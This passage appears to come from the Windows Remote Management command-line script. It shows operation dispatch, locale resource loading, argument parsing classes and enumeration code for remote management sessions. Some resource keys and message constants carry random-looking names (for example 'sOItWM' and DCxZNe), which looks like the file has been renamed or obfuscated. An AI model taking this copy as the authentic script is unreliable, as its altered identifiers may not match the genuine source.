'and input from @{...} instead of file, first do a Get to retrieve the present state 
'of the object against which to apply the @{...} changes prior to the actual Put.
on error resume next
if not ProcessInput(wsmanObj, operation, rootNdNameStr, _
           wsmanCmdLineObj, resourceLocatorObj,sessionObj, inputStr, formatOption) then    
   WScript.Quit(ERR_GENERAL_FAILURE)
end if
            
'Now execute the indicated operation.
on error resume next
select case operation
    case OP_DEL 
        sessionObj.Delete(resourceLocatorObj)
    case OP_GET 
        responseStr = sessionObj.Get(resourceLocatorObj)
    case OP_PUT
       responseStr = sessionObj.Put(resourceLocatorObj, inputStr)
    case OP_CONFIGSDDL
       responseStr = wsmanInternalObj.ConfigSDDL(sessionObj,resourceLocatorObj)    
    case OP_CRE
        responseStr = sessionObj.Create(resourceLocatorObj, inputStr)
    case OP_INV
        responseStr = sessionObj.Invoke(actionUriStr, resourceLocatorObj, inputStr)
    case OP_ENU
         Enumerate wsmanObj, sessionObj, wsmanCmdLineObj, resourceLocatorObj, formatOption
    case OP_IDENTIFY
        responseStr = sessionObj.Identify
    case OP_QUICKCONFIG
         QuickConfig sessionObj, wsmanCmdLineObj
    case else 
        ASSERTBOOL False, GetResource("sOItWM") & "'" & operation & "'"
end select

'Process the output or error messages.
if Err.Number <> 0 then
    ASSERTERR sessionObj, formatOption
    on error goto 0
else
    if operation <> OP_ENU and operation <> OP_DEL and operation <> OP_QUICKCONFIG then
        If Reformat(responseStr,formattedStr,formatOption) Then
            WScript.echo formattedStr
        Else
            stdErr.WriteLine GetResource("L_FORMATFAILED_Message")
            stdErr.WriteLine responseStr
            WScript.Quit(ERR_GENERAL_FAILURE)
        End If
    end if
end if

'Exist the script.
WScript.Quit(ERR_OK)

' ------------------ Utilities --------------------



'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Loads resource strings from an ini file of the appropriate locale
Private Function LoadResourceData
        If resourcesLoaded Then
                Exit Function
        End If 

    Dim lang, value, ini, zhHKlang, zhTWlang
        Dim fso
        Set fso = WScript.CreateObject("Scripting.FileSystemObject")
        
        On Error Resume Next
        lang = GetUILanguage()
        If Err.Number <> 0 Then
                'API does not exist prior to Vista, use Getlocale for downlevel
		Err.Clear
                lang = GetLocale()
        End If
        
        ' zh-HK will be treated as zh-TW
        zhHKlang = 3076
        zhTWlang = 1028
        If lang = zhHKlang Then
            lang = zhTWlang
        End If

    ini = fso.GetParentFolderName(WScript.ScriptFullName) & "\winrm\" _
        & ToHex(lang) & "\" & fso.GetBaseName(WScript.ScriptName) &  ".ini"

        'stderr.writeline "Reading resources from " & ini

    If fso.FileExists(ini) Then
        Dim stream, file
        Const ForReading = 1, TristateTrue = -1 'Read file in unicode format

        'Debug.WriteLine "Using resource file " & ini

        Set stream = fso.OpenTextFile(ini, ForReading, False, TristateTrue)
        ReadResources(stream)
           stream.Close
    End If

        resourcesLoaded = true
End Function

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Reads resource strings from an ini file
Function ReadResources(stream)
    Const ERROR_FILE_NOT_FOUND = 2
    Dim ln, arr, key, value

    If Not IsObject(stream) Then Err.Raise ERROR_FILE_NOT_FOUND

    Do Until stream.AtEndOfStream
        ln = stream.ReadLine

        arr = Split(ln, "=", 2, 1)
        If UBound(arr, 1) = 1 Then
            ' Trim the key and the value first before trimming quotes
            key = Trim(arr(0))
            value = TrimChar(Trim(arr(1)), """")

            'WScript.stderr.writeline "Read key " & key & " = " & value
                        If key <> "" Then
                                resourceDictionary.Add key, value
                        End If
        End If
    Loop
End Function

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Trim a character from the text string
Private Function TrimChar(s, c)
    Const vbTextCompare = 1

    ' Trim character from the start
    If InStr(1, s, c, vbTextCompare) = 1 Then
        s = Mid(s, 2)
    End If
        
    ' Trim character from the end
    If InStr(Len(s), s, c, vbTextCompare) = Len(s) Then
        s = Mid(s, 1, Len(s) - 1)
    End If

    TrimChar = s
End Function

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Get a 4-digit hexadecimal number
Private Function ToHex(n)
    Dim s : s = Hex(n)
    ToHex = String(4 - Len(s), "0") & s
End Function

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Get the resource string with the given name from the locale specific
' dictionary.  If not found, use the built in default.
Private function GetResource(name)
        LoadResourceData
        If resourceDictionary.Exists(name) Then
                GetResource = resourceDictionary.Item(name)
        Else
                GetResource = Eval(name)
        End If
End Function

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Reads entire text file and return as string
private function ReadFile(file)
    
    dim fso, f

    set fso = CreateObject("Scripting.FileSystemObject")
    ASSERTBOOL fso.FileExists(file), GetResource("UWLxC") & "'" & file & "'"
    set f = fso.OpenTextFile(file, 1, false,-2)
    ReadFile = f.ReadAll

    f.Close
    set f = Nothing
    set fso = Nothing
end function 

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Name:    CommandLineParser
' Purpose: To Parse Command-Line Arguments for access to Named and Unnamed 
'          arguments.

Class CommandLineParser
    Private m_allArguments
    Private m_namedArguments
    Private m_unnamedArguments
    Private m_operationShortcuts
    Private m_parameterShortcuts
    Private m_indexFirstSwitch

    Private Sub ErrorHandler(isFatal,errorMessage)
        WScript.StdErr.WriteLine GetResource("L_ERR_Message") & errorMessage
        If isFatal Then
            WScript.Quit(ERR_GENERAL_FAILURE)
        End If
    End Sub
    
    Private Sub Class_Initialize()
        Set m_allArguments     = CreateObject("Scripting.Dictionary")
        Set m_namedArguments   = CreateObject("Scripting.Dictionary")
        Set m_unnamedArguments = CreateObject("Scripting.Dictionary")
        m_indexFirstSwitch = -1

        Set m_operationShortcuts = CreateObject("Scripting.Dictionary")
        m_operationShortcuts.Add SHORTCUT_CRE,  OP_CRE
        m_operationShortcuts.Add SHORTCUT_DEL,  OP_DEL
        m_operationShortcuts.Add SHORTCUT_ENU,  OP_ENU
        m_operationShortcuts.Add SHORTCUT_ENU2, OP_ENU
        m_operationShortcuts.Add SHORTCUT_GET,  OP_GET
        m_operationShortcuts.Add SHORTCUT_INV,  OP_INV
        m_operationShortcuts.Add SHORTCUT_IDENTIFY,  OP_IDENTIFY
        m_operationShortcuts.Add SHORTCUT_PUT,  OP_PUT
        m_operationShortcuts.Add SHORTCUT_PUT2, OP_PUT
        m_operationShortcuts.Add SHORTCUT_PUT3, OP_PUT
        m_operationShortcuts.Add SHORTCUT_QUICKCONFIG, OP_QUICKCONFIG
        m_operationShortcuts.Add SHORTCUT_HELPMSG, OP_HELPMSG
        
        Set m_parameterShortcuts = CreateObject("Scripting.Dictionary")
        m_parameterShortcuts.Add SHORTCUT_AUTH,  NPARA_AUTH
        m_parameterShortcuts.Add SHORTCUT_AUTH2, NPARA_AUTH
        m_parameterShortcuts.Add SHORTCUT_PROXYACCESS,  NPARA_PROXYACCESS
        m_parameterShortcuts.Add SHORTCUT_PROXYACCESS2, NPARA_PROXYACCESS
        m_parameterShortcuts.Add SHORTCUT_PROXYAUTH,  NPARA_PROXYAUTH
        m_parameterShortcuts.Add SHORTCUT_PROXYAUTH2, NPARA_PROXYAUTH
        m_parameterShortcuts.Add SHORTCUT_FORMAT, NPARA_FORMAT
        m_parameterShortcuts.Add SHORTCUT_PASSWORD, NPARA_PASSWORD
        m_parameterShortcuts.Add SHORTCUT_PROXYPASSWORD, NPARA_PROXYPASSWORD
        m_parameterShortcuts.Add SHORTCUT_REMOTE,  NPARA_REMOTE
        m_parameterShortcuts.Add SHORTCUT_REMOTE2, NPARA_REMOTE
        m_parameterShortcuts.Add SHORTCUT_USERNAME, NPARA_USERNAME
        m_parameterShortcuts.Add SHORTCUT_PROXYUSERNAME, NPARA_PROXYUSERNAME
        m_parameterShortcuts.Add SHORTCUT_UNENCRYPTED, NPARA_UNENCRYPTED
        m_parameterShortcuts.Add SHORTCUT_USESSL, NPARA_USESSL
        m_parameterShortcuts.Add SHORTCUT_QUIET, NPARA_QUIET
        m_parameterShortcuts.Add SHORTCUT_CERT, NPARA_CERT
    End Sub

    Public Function FirstSwitchIndex()
        FirstSwitchIndex = m_indexFirstSwitch
    End Function

    Public Function Count()
          Count = m_unnamedArguments.Count + m_namedArguments.Count
    End Function
    Public Function UnnamedCount()
          UnnamedCount = m_unnamedArguments.Count
    End Function
    
    Public Function PositionName(index)
        Dim keyArray
        PositionName = ""
        If IsNumeric(index) Then
            If index >=0 And index < m_allArguments.Count Then
                PositionName = m_allArguments(index)
            End If
        End If
    End Function

    Public Function UnnamedExists(index)
        UnnamedExists = False
        If IsNumeric(index) Then
            If index >=0 And index < m_unnamedArguments.Count Then
                UnnamedExists = True
            End If
        End If
    End Function
    
    Public Function UnnamedValue(index)
        UnnamedValue = ""
        If IsNumeric(index) Then
            If index >=0 And index < m_unnamedArguments.Count Then
                UnnamedValue = m_unnamedArguments(index)
            End If
        End If
    End Function
    
    Public Function NamedCount()
        NamedCount = m_namedArguments.Count
    End Function
    Public Function NamedExists(key)
        NamedExists = m_namedArguments.Exists(key)
    End Function

    Public Function NamedValue(key)
        NamedValue = ""
        If m_namedArguments.Exists(key) Then
            NamedValue = m_namedArguments(key)
        End If
    End Function
    
    Public Function NamedValueByIndex(index)
        Dim itemArray
        NamedValueByIndex = ""
        If IsNumeric(index) Then
            If index >= 0 And index < m_namedArguments.Count Then
                itemArray = m_namedArguments.Items
                NamedValueByIndex = itemArray(index)
            End If
        End If
    End Function

    Public Function NamedKeyByIndex(index)
        Dim keyArray
        NamedKeyByIndex = ""
        If IsNumeric(index) Then
            If index >= 0 And index < m_namedArguments.Count Then
                keyArray = m_namedArguments.Keys
                NamedKeyByIndex = keyArray(index)
            End If
        End If
    End Function

    Public Function Parse(cmdlineStr)
        Dim cmdlineStrLen

        Dim parseIndex
        Dim inQuote
        Dim inCurly

        Dim currentParameter
        Dim parameterName
        Dim parameterValue
        Dim parameterColonPos
        Dim currentChar
        Dim parameterValueQuoted

        m_allArguments.RemoveAll
        m_namedArguments.RemoveAll
        m_unnamedArguments.RemoveAll   
             
        parseIndex = 1
        inCurly = False
        inQuote = False

        cmdlineStrLen = Len(cmdlineStr)

        Do While parseIndex <= cmdlineStrLen

            currentParameter = ""
            inQuote = False
            inCurly = False

            'skip whitespace
            Do While parseIndex <= cmdlineStrLen
                currentChar = Mid(cmdlineStr,parseIndex,1)
                If currentChar <> " " Then
                    Exit Do
                End If
                parseIndex = parseIndex + 1
            Loop

            'capture text until first unquoted or uncurlied space, or end of string
            Do While parseIndex <= cmdlineStrLen
                currentChar = Mid(cmdlineStr,parseIndex,1)
                If currentChar = "{" Then
                    If Not inQuote Then
                        inCurly = True
                    End If
                    currentParameter = currentParameter & currentChar
                ElseIf currentChar = "}" Then
                    If Not inQuote Then
                        inCurly = False
                    End If
                    currentParameter = currentParameter & currentChar
                ElseIf currentChar = """" Then
                    If inQuote Then
                        If Mid(cmdlineStr,parseIndex-1,1) <> "\" Then
                            inQuote = False
                        End If
                    Else
                        inQuote = True
                    End If
                    currentParameter = currentParameter & currentChar
                ElseIf currentChar = " " Then
                    If inQuote Or inCurly Then
                        currentParameter = currentParameter & currentChar
                    Else
                        Exit Do
                    End If
                Else
                    currentParameter = currentParameter & currentChar
                End If
                parseIndex = parseIndex + 1
            Loop

            'process the command line segment
            If Len(currentParameter) > 0 Then
                'for named parameters
                If Left(currentParameter,1) = "-" Or Left(currentParameter,1) = "/" Then
                    If Left(currentParameter,2) = "//" Or Left(currentParameter,2) = "--" Then
                        'skip all double-prefix parameters - assumed for scripting host i.e. //nologo
                    Else
                        parameterColonPos = InStr(currentParameter,":")
                        If parameterColonPos > 0 Then
                            parameterName = LCase(Mid(currentParameter,2,parameterColonPos-2))
                            parameterValueQuoted = False
                            If Mid(currentParameter,parameterColonPos + 1,1) = """" Then
                                If Right(currentParameter,1) = """" Then
                                    parameterValueQuoted = True
                                Else
                                    ErrorHandler True,GquTvj & parameterName
                                End If
                            ElseIf Mid(currentParameter,Len(currentParameter),1) = """" Then
                                ErrorHandler True,GquTvj & parameterName
                            End If
                            If parameterValueQuoted Then
                                parameterValue = Mid(currentParameter,parameterColonPos + 2,Len(currentParameter) - parameterColonPos - 2)
                            Else
                                parameterValue = Mid(currentParameter,parameterColonPos + 1)
                            End If
                        Else
                            parameterName = LCase(Mid(currentParameter,2))
                            parameterValue = ""
                        End If
                        If m_parameterShortcuts.Exists(LCase(parameterName)) Then
                            parameterName = m_parameterShortcuts(LCase(parameterName))
                        End If
                        If Len(parameterName) > 0 Then
                            If m_namedArguments.Exists(parameterName) Then
                                ErrorHandler True,ogaN & parameterName
                            End If
                            parameterValue = Replace(parameterValue, "\""", """")
                            If (0 = m_namedArguments.Count) Then
                                m_indexFirstSwitch = m_allArguments.Count
                            End If
                            If Len(parameterValue) > 0 Then
                                m_namedArguments.Add parameterName,parameterValue
                            Else
                                m_namedArguments.Add parameterName,""
                            End If
                            m_allArguments.Add m_allArguments.Count, parameterName
                        Else
                            ErrorHandler True,uCDqTM
                        End If
                    End If
                'for unnamed parameters             
                Else
                    parameterName = m_unnamedArguments.Count
                    If Left(currentParameter,1) = """" And Right(currentParameter,1) = """" Then
                        parameterValue = Mid(currentParameter,2,Len(currentParameter)-2)
                    Else                                        
                        parameterValue = currentParameter
                    End If
                    parameterValue = Replace(parameterValue, "\""", """")
                    If m_operationShortcuts.Exists(LCase(parameterValue)) Then
                         parameterValue = m_operationShortcuts(LCase(parameterValue))
                    End If
                    m_unnamedArguments.Add parameterName,parameterValue
                    m_allArguments.Add m_allArguments.Count, parameterValue
                End If
            End If
        Loop
        Parse = (m_unnamedArguments.Count + m_namedArguments.Count) > 0
    End Function
End Class

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
' Name:    WSManCommandLineParser
' Purpose: To Parse Command-Line Arguments and provide covenient access to all
'          WSMan specific arguments, named and unnamed, by making positional
'          effectively named
Class WSManCommandLineParser
    private m_op
    private m_commandLineParser
    private m_commandIndex
    private m_allowedOperations
    private m_allowedParameterNames
    private m_knownParameterNames

    Private Sub ErrorHandler(isFatal,errorMessage)
        WScript.StdErr.WriteLine GetResource("L_ERR_Message") & errorMessage
        If isFatal Then
            WScript.Quit(ERR_GENERAL_FAILURE)
        End If
    End Sub
    
    Private Sub LoadOperations
        m_allowedOperations.Add OP_GET, 1
        m_allowedOperations.Add OP_PUT, 1  
        m_allowedOperations.Add OP_CONFIGSDDL, 1
        m_allowedOperations.Add OP_CRE, 1
        m_allowedOperations.Add OP_DEL, 1
        m_allowedOperations.Add OP_ENU, 1
        m_allowedOperations.Add OP_INV, 2
        m_allowedOperations.Add OP_IDENTIFY, 0
        m_allowedOperations.Add OP_QUICKCONFIG, 0
        m_allowedOperations.Add OP_HELPMSG, 1
    End Sub

    Private Sub LoadAllowedParameters(op)
        m_allowedParameterNames.Add NPARA_HELP,true

        If (op = OP_QUICKCONFIG) Then
            m_allowedParameterNames.Add NPARA_QUIET,true
            m_allowedParameterNames.Add NPARA_TRANSPORT,true
            m_allowedParameterNames.Add NPARA_FORCE,true
        elseif (op = OP_IDENTIFY) Then
            m_allowedParameterNames.Add NPARA_USERNAME,true
            m_allowedParameterNames.Add NPARA_PASSWORD,true
            m_allowedParameterNames.Add NPARA_PROXYUSERNAME,true
            m_allowedParameterNames.Add NPARA_PROXYPASSWORD,true
            m_allowedParameterNames.Add NPARA_CERT,true
            m_allowedParameterNames.Add NPARA_REMOTE,true
            m_allowedParameterNames.Add NPARA_NOCACHK,true
            m_allowedParameterNames.Add NPARA_NOCNCHK,true
            m_allowedParameterNames.Add NPARA_NOREVCHK,true
            m_allowedParameterNames.Add NPARA_DEFAULTCREDS,true
            m_allowedParameterNames.Add NPARA_SPNPORT,true
            m_allowedParameterNames.Add NPARA_TIMEOUT,true
            m_allowedParameterNames.Add NPARA_AUTH,true
            m_allowedParameterNames.Add NPARA_PROXYACCESS,true
            m_allowedParameterNames.Add NPARA_PROXYAUTH,true
            m_allowedParameterNames.Add NPARA_UNENCRYPTED,true
            m_allowedParameterNames.Add NPARA_USESSL,true
            m_allowedParameterNames.Add NPARA_ENCODING,true
            m_allowedParameterNames.Add NPARA_FORMAT,true        
        Else
            m_allowedParameterNames.Add NPARA_USERNAME,true
            m_allowedParameterNames.Add NPARA_PASSWORD,true
            m_allowedParameterNames.Add NPARA_PROXYUSERNAME,true
            m_allowedParameterNames.Add NPARA_PROXYPASSWORD,true
            m_allowedParameterNames.Add NPARA_CERT,true
            m_allowedParameterNames.Add NPARA_DIALECT,true
            m_allowedParameterNames.Add NPARA_FILE,true
            m_allowedParameterNames.Add NPARA_FILTER,true
            m_allowedParameterNames.Add NPARA_REMOTE,true
            m_allowedParameterNames.Add NPARA_NOCACHK,true
            m_allowedParameterNames.Add NPARA_NOCNCHK,true
            m_allowedParameterNames.Add NPARA_NOREVCHK,true
            m_allowedParameterNames.Add NPARA_DEFAULTCREDS,true
            m_allowedParameterNames.Add NPARA_SPNPORT,true
            m_allowedParameterNames.Add NPARA_TIMEOUT,true
            m_allowedParameterNames.Add NPARA_AUTH,true
            m_allowedParameterNames.Add NPARA_PROXYACCESS,true
            m_allowedParameterNames.Add NPARA_PROXYAUTH,true
            m_allowedParameterNames.Add NPARA_UNENCRYPTED,true
            m_allowedParameterNames.Add NPARA_USESSL,true
            m_allowedParameterNames.Add NPARA_ENCODING,true
            m_allowedParameterNames.Add NPARA_FORMAT,true
            m_allowedParameterNames.Add NPARA_OPTIONS,true
            m_allowedParameterNames.Add NPARA_FRAGMENT,true
        End If

        if (op = OP_ENU) Then
            m_allowedParameterNames.Add NPARA_RETURN_TYPE,true
            m_allowedParameterNames.Add NPARA_SHALLOW,true
            m_allowedParameterNames.Add NPARA_BASE_PROPS_ONLY,true
            m_allowedParameterNames.Add NPARA_ASSOCINST,true
        End If
        
        m_knownParameterNames.Add NPARA_HELP,true
        m_knownParameterNames.Add NPARA_QUIET,true
        m_knownParameterNames.Add NPARA_FORCE,true
        m_knownParameterNames.Add NPARA_TRANSPORT,true
        m_knownParameterNames.Add NPARA_USERNAME,true
        m_knownParameterNames.Add NPARA_PASSWORD,true
        m_knownParameterNames.Add NPARA_PROXYUSERNAME,true
        m_knownParameterNames.Add NPARA_PROXYPASSWORD,true
        m_knownParameterNames.Add NPARA_CERT,true
        m_knownParameterNames.Add NPARA_DIALECT,true
        m_knownParameterNames.Add NPARA_ASSOCINST,true
        m_knownParameterNames.Add NPARA_FILE,true
        m_knownParameterNames.Add NPARA_FILTER,true
        m_knownParameterNames.Add NPARA_REMOTE,true
        m_knownParameterNames.Add NPARA_NOCACHK,true
        m_knownParameterNames.Add NPARA_NOCNCHK,true
        m_knownParameterNames.Add NPARA_NOREVCHK,true
        m_knownParameterNames.Add NPARA_DEFAULTCREDS,true
        m_knownParameterNames.Add NPARA_SPNPORT,true
        m_knownParameterNames.Add NPARA_TIMEOUT,true
        m_knownParameterNames.Add NPARA_AUTH,true
        m_knownParameterNames.Add NPARA_PROXYACCESS,true
        m_knownParameterNames.Add NPARA_PROXYAUTH,true
        m_knownParameterNames.Add NPARA_UNENCRYPTED,true
        m_knownParameterNames.Add NPARA_USESSL,true
        m_knownParameterNames.Add NPARA_ENCODING,true
        m_knownParameterNames.Add NPARA_FORMAT,true
        m_knownParameterNames.Add NPARA_OPTIONS,true
        m_knownParameterNames.Add NPARA_FRAGMENT,true
        m_knownParameterNames.Add NPARA_RETURN_TYPE,true
        m_knownParameterNames.Add NPARA_SHALLOW,true
        m_knownParameterNames.Add NPARA_BASE_PROPS_ONLY,true
    End Sub

    Public Function ValidateArguments()
        Dim unnamedCount
        Dim unnamedCountExpected
        Dim valid 
        Dim index
        valid = True

        m_op = LCase(Argument(NPARA_PSEUDO_OPERATION))
        If (Not m_allowedOperations.Exists(m_op)) Then
            ErrorHandler True, GetResource("sOItWM") & "'" & m_op & "'"
        End If

        LoadAllowedParameters m_op

        'Make sure there the right number of unnamed arguments based upon op
        unnamedCount = m_commandLineParser.UnnamedCount - m_commandIndex
        unnamedCountExpected = m_allowedOperations(m_op) + 2
        'Remove @{} from count
        If (ArgumentExists(NPARA_PSEUDO_AT)) Then
            unnamedCount = unnamedCount - 1
        End If
        If (unnamedCount <> unnamedCountExpected) Then
            valid = False
        End If

        'Make sure the unnamed parameters come first
        If (m_commandLineParser.FirstSwitchIndex <= unnamedCountExpected) Then
            If (m_commandLineParser.FirstSwitchIndex > 0) Then
                valid = False
            End If
        End If

        If (ArgumentExists(NPARA_PSEUDO_AT) Or ArgumentExists(NPARA_FILE)) Then
            If (operation <> OP_INV And operation <> OP_CRE And operation <> OP_PUT) Then
                ErrorHandler True, L_OpDoesntAcceptInput_ErrorMessage
            End If
        End If

        'loop through all named parameters and make sure they are in the allowed list
        For index = 0 To m_commandLineParser.NamedCount - 1
            If Not m_knownParameterNames.Exists(LCase(m_commandLineParser.NamedKeyByIndex(index))) Then
                valid = False
                ErrorHandler False, GetResource("YNRKc") & m_commandLineParser.NamedKeyByIndex(index)
            Elseif Not m_allowedParameterNames.Exists(LCase(m_commandLineParser.NamedKeyByIndex(index))) Then
                valid = False
                ErrorHandler False, GetResource("QsMlt") & m_commandLineParser.NamedKeyByIndex(index)
            End If
        Next
        If Not valid Then
            ErrorHandler True,DCxZNe & m_commandLineParser.NamedKeyByIndex(index)
        End If
    End Function

    Private Sub Class_Initialize()
        Set m_commandLineParser = New CommandLineParser
        Set m_allowedOperations     = CreateObject("Scripting.Dictionary")
        Set m_allowedParameterNames = CreateObject("Scripting.Dictionary")
        Set m_knownParameterNames   = CreateObject("Scripting.Dictionary")
        m_commandIndex = 0
        LoadOperations
    End Sub

    Public Function Operation()
        Operation = m_op
    End Function

    Public Function ArgumentExists(argumentName)
        Dim index
        ArgumentExists = False
        If LCase(argumentName) = NPARA_PSEUDO_COMMAND Then
            ArgumentExists = m_commandLineParser.UnnamedExists(m_commandIndex)
        ElseIf LCase(argumentName) = NPARA_PSEUDO_OPERATION Then
            ArgumentExists = m_commandLineParser.UnnamedExists(m_commandIndex + 1)
        ElseIf LCase(argumentName) = NPARA_PSEUDO_ACTION Then
            If LCase(m_commandLineParser.UnnamedValue(m_commandIndex + 1)) = OP_INV Then
                ArgumentExists = m_commandLineParser.UnnamedExists(m_commandIndex + 2)
            End If
        ElseIf LCase(argumentName) = NPARA_PSEUDO_RESOURCE Then
            If LCase(m_commandLineParser.UnnamedValue(m_commandIndex + 1)) = OP_INV Then
                ArgumentExists = m_commandLineParser.UnnamedExists(m_commandIndex + 3)
            Else
                ArgumentExists = m_commandLineParser.UnnamedExists(m_commandIndex + 2)
            End If
        ElseIf argumentName = NPARA_PSEUDO_AT Then
            For index = m_commandIndex To m_commandLineParser.UnnamedCount - 1
                If Mid(m_commandLineParser.UnnamedValue(index),1,1) = NPARA_PSEUDO_AT Then
                    ArgumentExists = True
                    Exit For
                End If
            Next
        Else
            ArgumentExists = m_commandLineParser.NamedExists(argumentName)
        End If
    End Function

    Public Function Argument(argumentName)
        Dim index
        If IsNumeric(argumentName) Then
            Argument = m_commandLineParser.PositionName(argumentName + m_commandIndex)
        ElseIf LCase(argumentName) = NPARA_PSEUDO_COMMAND Then
            Argument = m_commandLineParser.UnnamedValue(m_commandIndex)
        ElseIf LCase(argumentName) = NPARA_PSEUDO_OPERATION Then
            Argument = m_commandLineParser.UnnamedValue(m_commandIndex + 1)
        ElseIf LCase(argumentName) = NPARA_PSEUDO_ACTION Then
            If LCase(m_commandLineParser.UnnamedValue(m_commandIndex + 1)) = OP_INV Then
                Argument = m_commandLineParser.UnnamedValue(m_commandIndex + 2)
            Else
                Argument = ""
            End If
        ElseIf LCase(argumentName) = NPARA_PSEUDO_RESOURCE Then
            If LCase(m_commandLineParser.UnnamedValue(m_commandIndex + 1)) = OP_INV Then
                Argument = m_commandLineParser.UnnamedValue(m_commandIndex + 3)
            Else
                Argument = m_commandLineParser.UnnamedValue(m_commandIndex + 2)
            End If
        ElseIf argumentName = NPARA_PSEUDO_AT Then
            For index = m_commandIndex To m_commandLineParser.UnnamedCount - 1
                If Mid(m_commandLineParser.UnnamedValue(index),1,1) = NPARA_PSEUDO_AT Then
                    Argument = Mid(m_commandLineParser.UnnamedValue(index),2)
                    Exit For
                Else
                    Argument = ""
                End If
            Next
        Else
            Argument = m_commandLineParser.NamedValue(argumentName)
            If argumentName = NPARA_FORMAT Then
                If (Mid(Argument,1,1) = "#") Then
                   Argument = Mid(Argument,2)
                End If
            End If
        End If
    End Function
        
    Public Function Count
        Count = m_commandLineParser.Count - m_commandIndex
    End Function

    Public Function Parse(commandLineStr)
        Dim rval
        Dim index
        rval = m_commandLineParser.Parse(commandLineStr)
        If rval Then
            rval = False
            For index = 0 To m_commandLineParser.UnnamedCount - 1
                If InStr(LCase(m_commandLineParser.UnnamedValue(index)),"winrm.vbs") > 0 Then
                    m_commandIndex = index
                    rval = True
                    Exit For
                End If
            Next
            If Not rval Then
                ErrorHandler True, GetResource("jOCXkY")
            End If
        End If
        Parse = rval
    End Function

End Class


'''''''''''''''''''''    
' Removes ?params part from URI

private function StripParams(uri)
    
    dim qmpos
    
    ASSERTBOOL Len(uri) <> 0, GetResource("UWcPq")
    
    qmpos = InStr(uri, "?")
    if qmpos <> 0 then
        StripParams = Left(uri, qmpos - 1)
    else
        StripParams = uri
    end if

      
end function

'''''''''''''''''''''    
' Enumerate helper

private function Enumerate(wsmanObj, session, cmdlineOptions, resLocator, formatOption)
    dim filter
    dim dialect
    dim e
    dim res
    dim formattedText
    dim flags
    
    flags = 0
     
    if cmdlineOptions.ArgumentExists(NPARA_FILTER) then
        filter = cmdlineOptions.Argument(NPARA_FILTER)
        dialect = URI_WQL_DIALECT
    end if
    
    if cmdlineOptions.ArgumentExists(NPARA_DIALECT) then
        dialect = cmdlineOptions.Argument(NPARA_DIALECT)
    end if
    
    If LCase(dialect) = "selector" Then
        dialect = "http://schemas.dmtf.org/wbem/wsman/1/wsman/SelectorFilter"
    End If
    If LCase(dialect) = "http://schemas.dmtf.org/wbem/wsman/1/wsman/selectorfilter" Then
        dim dict
        set dict = ProcessParameterHash(filter)
        If dict Is Nothing Then
            Exit Function
        End If

        Dim name
        Dim value
        filter = "<wsman:SelectorSet xmlns:wsman='http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd'>"
        For Each name In dict
            value = dict(name)
            filter = filter & "<wsman:Selector Name='" & Escape(name) & "'>" & Escape(value) & "</wsman:Selector>"
        Next
        filter = filter & "</wsman:SelectorSet>"
    End If
    If LCase(dialect) = "wql" Then
        dialect = "http://schemas.microsoft.com/wbem/wsman/1/WQL"
    End If

    If LCase(dialect) = "association" Then
        dialect = "http://schemas.dmtf.org/wbem/wsman/1/cimbinding/AssociationFilter"
    End If
    If LCase(dialect) = LCase("http://schemas.dmtf.org/wbem/wsman/1/cimbinding/AssociationFilter") Then
        If not cmdlineOptions.ArgumentExists(NPARA_FILTER) Then
            ASSERTBOOL false, "-" & NPARA_FILTER & " parameter is required for the given dialect"
        End If
        If (cmdlineOptions.ArgumentExists(NPARA_ASSOCINST)) Then
            flags = flags OR wsmanObj.EnumerationFlagAssociationInstance
        Else
            flags = flags OR wsmanObj.EnumerationFlagAssociatedInstance
        End if
    End If
    If ( (LCase(dialect) <> LCase("http://schemas.dmtf.org/wbem/wsman/1/cimbinding/AssociationFilter")) and cmdlineOptions.ArgumentExists(NPARA_ASSOCINST) ) Then
        ASSERTBOOL false, "-" & NPARA_ASSOCINST & " is not a valid option for the given dialect"
    End If

    if cmdlineOptions.ArgumentExists(NPARA_RETURN_TYPE) then
        select case LCase(cmdlineOptions.Argument(NPARA_RETURN_TYPE))
            case VAL_RT_OBJECT
                ' default
            case VAL_RT_EPR
                flags = flags OR wsmanObj.EnumerationFlagReturnEPR
            case VAL_RT_OBJ_EPR
                flags = flags OR wsmanObj.EnumerationFlagReturnObjectAndEPR
            case else
                ASSERTBOOL false, "-" & NPARA_RETURN_TYPE & ":" & cmdlineOptions.Argument(NPARA_RETURN_TYPE) & " is not a valid option"
        end select
    end if
    
    if (cmdlineOptions.ArgumentExists(NPARA_SHALLOW)) then
        flags = flags OR wsmanObj.EnumerationFlagHierarchyShallow
    elseif (cmdlineOptions.ArgumentExists(NPARA_BASE_PROPS_ONLY)) then
        flags = flags OR wsmanObj.EnumerationFlagHierarchyDeepBasePropsOnly
    else
        flags = flags OR wsmanObj.EnumerationFlagHierarchyDeep
    end if

    on error resume next
    set e = session.Enumerate(resLocator, filter, dialect, flags)
    if Err.Number = T_O then
        set e = session.Enumerate(resLocator, filter, dialect, flags)
        if Err.Number = T_O then
            set e = session.Enumerate(resLocator, filter, dialect, flags)
        end if
    end if
    ASSERTERR session, formatOption
    on error goto 0
    
    if cmdlineOptions.ArgumentExists(NPARA_TIMEOUT) then
        e.Timeout = cmdlineOptions.Argument(NPARA_TIMEOUT)
    end if

    if(LCase(formatOption) <> VAL_FORMAT_TEXT) then
        wscript.echo "<wsman:Results xmlns:wsman=""http://schemas.dmtf.org/wbem/wsman/1/wsman/results"">"
    end if
    
    do while Not e.AtEndOfStream
        on error resume next
        res = e.ReadItem()
        if Err.Number = T_O then
            res = e.ReadItem()
            if Err.Number = T_O then
                res = e.ReadItem()
            end if
        end if
        if Err.Number <> 0 then
            stdErr.WriteLine e.Error
            wscript.echo "</wsman:Results>"
        end if
        ASSERTERR e, formatOption
        on error goto 0
        
        'reformat if requested
        on error resume next
        err.clear
        if not Reformat(res,formattedText,formatOption) then
            exit do
        end if
        wscript.echo formattedText
    loop        
    
    if(LCase(formatOption) <> VAL_FORMAT_TEXT) then
        wscript.echo "</wsman:Results>"
